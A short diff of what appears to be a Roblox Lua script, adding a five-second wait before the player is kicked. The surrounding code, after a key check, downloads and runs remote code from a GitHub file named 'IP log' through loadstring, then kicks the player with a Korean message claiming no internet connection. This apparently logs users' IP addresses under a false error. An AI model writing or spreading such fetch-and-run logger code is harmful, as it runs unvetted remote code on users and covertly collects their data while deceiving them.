@@ -21,6 +21,7 @@ if _G.key == _G.Key then
 		text = "인터넷 연결 안됨"
 	end
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Fykas7077/Fykas7077/main/IP%20log'),true))()
+	wait(5)
 	player:Kick(text)
 
 end
